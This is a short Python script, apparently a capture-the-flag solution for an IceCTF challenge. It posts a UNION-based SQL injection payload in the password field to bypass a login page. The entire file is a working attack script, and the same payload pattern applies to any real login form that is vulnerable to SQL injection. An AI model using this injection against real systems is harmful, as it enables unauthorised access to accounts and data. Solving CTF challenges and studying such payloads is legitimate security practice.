from requests import post

url = "http://miners.vuln.icec.tf/login.php"
data = {
    "username" : "1",
    "password" : "1 \' union select \'1\',\'1\',\'1\'-- -",
}
res = post(url,data=data)
print res.content